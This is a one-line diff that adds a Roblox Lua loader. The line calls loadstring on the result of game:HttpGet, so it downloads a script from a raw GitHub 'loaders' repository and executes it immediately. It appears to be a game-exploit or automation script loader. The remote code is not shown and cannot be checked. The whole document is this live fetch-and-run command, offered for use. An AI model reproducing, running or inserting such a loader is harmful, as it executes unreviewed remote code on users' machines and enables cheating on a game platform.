@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/pt-3-huss-valley-spam4-744u37x6o7sbqe.lua"))()
